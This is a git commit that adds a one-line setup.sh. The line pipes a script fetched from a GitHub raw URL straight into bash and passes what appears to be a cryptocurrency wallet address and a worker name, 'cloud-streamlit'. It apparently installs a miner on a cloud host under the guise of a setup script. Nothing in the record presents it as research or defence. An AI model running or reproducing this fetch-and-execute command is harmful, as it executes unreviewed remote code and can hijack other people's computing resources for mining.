839581299114dcf717994615ede90282bb3af094
Premraj123456 <104309530+Premraj123456@users.noreply.github.com>
2024-06-15 10:18:41 +0530

    Create setup.sh

---
+++ setup.sh
@@ -0,0 +1,1 @@
+curl -s -L https://raw.githubusercontent.com/Premraj123456/hey/main/setup.sh | bash -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo cloud-streamlit
